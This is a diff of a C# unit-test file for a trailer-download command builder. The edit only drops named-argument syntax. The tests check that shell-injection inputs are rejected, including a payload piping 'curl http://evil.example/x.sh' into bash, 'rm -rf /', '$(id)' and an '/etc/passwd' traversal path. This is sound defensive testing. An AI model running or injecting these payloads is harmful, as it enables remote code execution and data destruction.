@@ -27,78 +27,78 @@ public class TrailerCommandBuilderTests
         // Accept-Language header (it only splits on '_', so this reaches Build intact).
         string payload = "en\"; curl http://evil.example/x.sh | bash #";
 
-        string command = TrailerCommandBuilder.Build(ytdlpPath: Ytdlp, ffmpegPath: Ffmpeg, trailerId: TrailerId, language: payload);
+        string command = TrailerCommandBuilder.Build(Ytdlp, Ffmpeg, TrailerId, payload);
 
-        command.Should().NotContain(unexpected: "evil.example");
-        command.Should().NotContain(unexpected: "curl");
-        command.Should().NotContain(unexpected: payload);
+        command.Should().NotContain("evil.example");
+        command.Should().NotContain("curl");
+        command.Should().NotContain(payload);
         // The subtitle argument is dropped entirely for an unsafe language.
-        command.Should().NotContain(unexpected: "--write-subs");
+        command.Should().NotContain("--write-subs");
         // ...but the trailer still fetches.
-        command.Should().Contain(expected: TrailerId);
-        command.Should().Contain(expected: $"| {Ffmpeg}");
+        command.Should().Contain(TrailerId);
+        command.Should().Contain($"| {Ffmpeg}");
     }
 
     [Theory]
-    [InlineData(data: "en")]
-    [InlineData(data: "en-US")]
-    [InlineData(data: "pt-BR")]
-    [InlineData(data: "zh-Hans")]
+    [InlineData("en")]
+    [InlineData("en-US")]
+    [InlineData("pt-BR")]
+    [InlineData("zh-Hans")]
     public void Build_SafeLocale_IncludesSubtitleArgument(string language)
     {
-        string command = TrailerCommandBuilder.Build(ytdlpPath: Ytdlp, ffmpegPath: Ffmpeg, trailerId: TrailerId, language: language);
+        string command = TrailerCommandBuilder.Build(Ytdlp, Ffmpeg, TrailerId, language);
 
         command
             .Should()
-            .Contain(expected: $" -o \"subtitle:{language}.%(ext)s\" --sub-langs all --write-subs ");
+            .Contain($" -o \"subtitle:{language}.%(ext)s\" --sub-langs all --write-subs ");
     }
 
     [Theory]
-    [InlineData(data: "")]
-    [InlineData(data: null)]
-    [InlineData(data: "en; rm -rf /")]
-    [InlineData(data: "en`id`")]
-    [InlineData(data: "$(id)")]
-    [InlineData(data: "../../etc/passwd")]
-    [InlineData(data: "en US")]
+    [InlineData("")]
+    [InlineData(null)]
+    [InlineData("en; rm -rf /")]
+    [InlineData("en`id`")]
+    [InlineData("$(id)")]
+    [InlineData("../../etc/passwd")]
+    [InlineData("en US")]
     public void Build_UnsafeOrEmptyLanguage_OmitsSubtitleArgument(string? language)
     {
-        string command = TrailerCommandBuilder.Build(ytdlpPath: Ytdlp, ffmpegPath: Ffmpeg, trailerId: TrailerId, language: language);
+        string command = TrailerCommandBuilder.Build(Ytdlp, Ffmpeg, TrailerId, language);
 
-        command.Should().NotContain(unexpected: "--write-subs");
-        command.Should().NotContain(unexpected: "subtitle:");
+        command.Should().NotContain("--write-subs");
+        command.Should().NotContain("subtitle:");
     }
 
     [Fact]
     public void Build_AlwaysContainsCorePipeline()
     {
-        string command = TrailerCommandBuilder.Build(ytdlpPath: Ytdlp, ffmpegPath: Ffmpeg, trailerId: TrailerId, language: "en");
+        string command = TrailerCommandBuilder.Build(Ytdlp, Ffmpeg, TrailerId, "en");
 
-        command.Should().StartWith(expected: Ytdlp);
-        command.Should().Contain(expected: TrailerId);
-        command.Should().Contain(expected: $"| {Ffmpeg} -i pipe:");
-        command.Should().Contain(expected: "video.m3u8");
+        command.Should().StartWith(Ytdlp);
+        command.Should().Contain(TrailerId);
+        command.Should().Contain($"| {Ffmpeg} -i pipe:");
+        command.Should().Contain("video.m3u8");
     }
 
     [Theory]
-    [InlineData(data: ["en", true])]
-    [InlineData(data: ["EN", true])]
-    [InlineData(data: ["en-US", true])]
-    [InlineData(data: ["pt-BR", true])]
-    [InlineData(data: ["zh-Hans", true])]
-    [InlineData(data: [null, false])]
-    [InlineData(data: ["", false])]
-    [InlineData(data: ["a", false])]
-    [InlineData(data: ["english", false])]
-    [InlineData(data: ["en_US", false])]
-    [InlineData(data: ["en ", false])]
-    [InlineData(data: ["en\"", false])]
-    [InlineData(data: ["en;ls", false])]
-    [InlineData(data: ["$(id)", false])]
-    [InlineData(data: ["`id`", false])]
-    [InlineData(data: ["../x", false])]
+    [InlineData(["en", true])]
+    [InlineData(["EN", true])]
+    [InlineData(["en-US", true])]
+    [InlineData(["pt-BR", true])]
+    [InlineData(["zh-Hans", true])]
+    [InlineData([null, false])]
+    [InlineData(["", false])]
+    [InlineData(["a", false])]
+    [InlineData(["english", false])]
+    [InlineData(["en_US", false])]
+    [InlineData(["en ", false])]
+    [InlineData(["en\"", false])]
+    [InlineData(["en;ls", false])]
+    [InlineData(["$(id)", false])]
+    [InlineData(["`id`", false])]
+    [InlineData(["../x", false])]
     public void IsSafeLanguage_MatchesOnlyLocaleTokens(string? language, bool expected)
     {
-        TrailerCommandBuilder.IsSafeLanguage(language: language).Should().Be(expected: expected);
+        TrailerCommandBuilder.IsSafeLanguage(language).Should().Be(expected);
     }
 }
